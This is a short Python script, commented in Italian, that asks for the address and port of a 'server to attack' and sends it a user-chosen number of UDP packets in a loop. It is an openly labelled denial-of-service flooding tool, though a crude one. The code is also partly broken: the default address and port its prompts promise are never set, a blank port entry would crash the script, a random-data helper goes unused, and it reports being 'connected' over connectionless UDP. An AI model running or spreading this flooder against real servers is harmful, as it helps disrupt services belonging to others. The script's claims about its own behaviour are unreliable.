import socket, random ,string ,time

def random_data():
    random_numbers = []
    while sum(len(str(num)) for num in random_numbers) < 1024:
        random_numbers.append(str(random.randint(1, 1024)))  # Genera numeri casuali tra 1 e 1024
    return ''.join(random_numbers)  # Ritorna la concatenazione dei numeri


cln_addrs = input("inserire l'indirizzo del server da attaccare (se non viene scritto nulla sara 127.0.0.1): ")
cln_port = int(input("inserire la porta del server da attaccare (se non viene inserito nulla sara 12345): "))

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

server_address = (cln_addrs, cln_port)

try:
    print(f"Connesso al server {cln_addrs} sulla porta {cln_port}")

    # Chiedi all'utente quante volte inviare i pacchetti
    i = int(input("Quante volte vuoi mandare questo messaggio al server? : "))
    z = 0

    while z < i:
        pacchetto = "1024\n"  # Pacchetto di esempio
        s.sendto(pacchetto.encode(), server_address)  # Utilizzo sendto per UDP
        print(f"Pacchetto {z + 1} inviato (dimensione: {len(pacchetto)} byte): {pacchetto[:50]}...")
        z += 1
        time.sleep(0.1)

except socket.error as e:
    print(f"Errore durante la comunicazione con il server: {e}")
finally:
    s.close()